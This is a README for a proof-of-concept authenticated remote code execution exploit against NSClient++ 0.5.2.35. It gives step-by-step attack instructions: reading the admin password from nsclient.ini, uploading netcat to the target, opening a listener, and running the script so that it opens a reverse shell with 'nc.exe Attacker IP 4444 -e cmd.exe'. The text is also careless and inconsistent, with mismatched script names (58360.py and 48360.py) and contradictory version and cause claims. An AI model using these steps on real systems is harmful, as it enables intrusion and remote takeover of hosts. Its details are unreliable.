** NSClient++ 0.5.2.35 Authenticated RCE Exploit

This repository contains a proof-of-concept (PoC) exploit for a Remote Code Execution (RCE) vulnerability in the **NSClient++ 0.5.2.35** version. 
The vulnerability allows authenticated users to execute arbitrary commands on the target system. This exploit leverages the **NSClient++** service's improper authentication handling,
which can be exploited by sending specially crafted requests.

** Vulnerability Overview:
NSClient++ versions prior to 0.5.2.35 are vulnerable to a Remote Code Execution (RCE) issue where an authenticated attacker can execute arbitrary commands on a remote server. 
This issue is caused by insecure handling of inputs from the attacker, which allows execution of arbitrary commands with administrative privileges.

** How to Use:
To run the exploit, you need to provide the following arguments: 
--->>>>>
1. Firt you have to chane the name to (58360.py)
2. make temp directory in target system named with temp
3. forword the port if needed on Attacker machine using the following command  ->  ssh -L 8443:127.0.0.1:8443 user@domain
4. upload your (nc64.exe) from attacker machine to the target on temp directory
5. by using the arguments in the code
----->   
5.1 **Target IP Address** (`-t`): The IP address of the target system running the vulnerable NSClient++ service.
5.2 **Target Port** (`-P`): The port number of the NSClient++ service (default is typically 5666 unless changed).
5.3 **Password** (`-p`): The administrative password for NSClient++ on the target system. ## read the password on the system using --> `type nsclient.ini
5.4 **Command to Execute** (`-c`): The command you want to execute on the target system once authenticated. ##in the terget upload it in "temp"
--------- 
6. Finally open listener then exploit the target with
 ```bash
    nc -lnvp 4444
    python3 48360.py -t 127.0.0.1 -P 8443 -p "Password" -c "c:\temp\nc.exe "Attacker IP" 4444 -e cmd.exe"

